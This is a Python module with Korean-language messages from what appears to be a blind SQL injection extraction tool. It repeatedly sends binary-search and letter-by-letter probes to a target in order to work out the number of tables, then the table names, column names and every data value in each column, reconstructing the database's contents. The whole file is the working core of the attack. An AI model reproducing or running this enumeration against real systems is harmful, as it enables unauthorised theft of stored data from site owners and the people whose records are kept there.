from attack_setting import *
from binary_search import *
from attack_query import *

class getData:
    query = attackQuerys()
    def get_tables(destination):
        
        result = tableInfo()
        print('테이블 수 찾는 중',end="",flush=True)
        table_count = Search.binary_search(destination,getData.query.get_table_query('count'))
        print('\n테이블 수 ',table_count)
        

        for i in range(1,table_count+1):
            print(f'\n{i}번째 테이블의 글자 수 찾는 중',end="",flush=True)
            length_query = getData.query.get_table_query('length',rnum=i)
            table_name_length = Search.binary_search(destination,length_query)
            print(f'\n{i}번째 테이블의 글자 수 = {table_name_length}')

            print(f'\n{i}번째 테이블의 글자 찾는 중 : ',end="",flush=True)
            table_name_query = getData.query.get_table_query('data',rnum=i)
            table_name = Search.letter_search(destination,table_name_query,table_name_length)
            #print(f'\n{i}번째 테이블 이름 = {table_name}')
            print("")

            result.append_table(table_name)
            
        
        print("테이블 목록 : ",result.tables)
        return result
        

    def get_columns(destination,result,table_name):

        if table_name not in result.tables:
            print("해당 테이블 명이 목록에 존재하지 않습니다.")
            return 0
        
        else:
            print(f'\n테이블 이름({table_name}) 내 컬럼 갯수 찾는 중',end="",flush=True)
            column_count = Search.binary_search(destination,getData.query.get_column_query('count',table_name=table_name))
            print(f'\n테이블 이름({table_name}) 내 컬럼 갯수 : ',column_count)
            
            
            for i in range(1,column_count+1):
                print(f"{i}. ",end="",flush=True)
                #print(f'\n{table_name} : {i}번째 컬럼의 글자 수 찾는 중',end="",flush=True)
                length_query = getData.query.get_column_query('length',table_name=table_name,rnum=i)
                column_name_length = Search.binary_search(destination,length_query)
                #print(f'\n{table_name} : {i}번째 컬럼의 글자 수 = {column_name_length}')

                #print(f'\n{table_name} : {i}번째 컬럼의 글자 찾는 중',end="",flush=True)
                column_name_query = getData.query.get_column_query('data',table_name=table_name,rnum=i)
                column_name = Search.letter_search(destination,column_name_query,column_name_length)
                #print(f'\n{table_name} : {i}번째 컬럼 이름 = {column_name}')\
                print("")

                result.append_column(table_name=table_name,column_name=column_name)
                #print(result.columns)
            
                    

    def get_datas(destination,result,table_name):
        if table_name not in result.tables:
            print("해당 테이블이 존재하지 않습니다.")
            return 0
        
        if not result.columns[table_name]:
            print("해당 테이블 내 컬럼이 존재하지 않습니다.")
            return 0
        
        else:
            print(f"\n table : {table_name}")
            for column_name in result.columns[table_name]:
                print(f'\n{table_name}:{column_name} 내 데이터 갯수 찾는 중',end="",flush=True)
                data_count = Search.binary_search(destination,getData.query.get_data_query('count',table_name=table_name,column_name=column_name))
                print(f'\n{table_name}:{column_name} 내 데이터 갯수 : ',data_count)
                #result.data_counts[table_name][column_name] = data_count
                print(f'\n{table_name}:{column_name} : ',end="",flush=True)
                print("[",end="",flush=True)
                for i in range(1,data_count+1):
                    #print(f'\n{table_name}:{column_name} : {i}번째 데이터의 글자 수 찾는 중',end="",flush=True)
                    length_query = getData.query.get_data_query('length',table_name=table_name,column_name=column_name,rnum=i)
                    data_length = Search.binary_search(destination,length_query)
                    #print(f'\n{table_name}:{column_name} :{i}번째 데이터의 글자 수 = {data_length}')
                    
                    #print(f'\n{table_name}:{column_name} :{i}번째 데이터의 글자 찾는 중',end="",flush=True)
                    data_name_query = getData.query.get_data_query('data',table_name=table_name,column_name=column_name,rnum=i)
                    
                    data = Search.letter_search(destination,data_name_query,data_length)
                    if(i!=data_count):
                        print(",",end=" ",flush=True)
                        #print(f'\n{table_name}:{column_name} :{i}번째 데이터 이름 = {data}')

                    result.append_datas(table_name,column_name,data)
                    #print(result.datas)
                print("]",end="",flush=True)


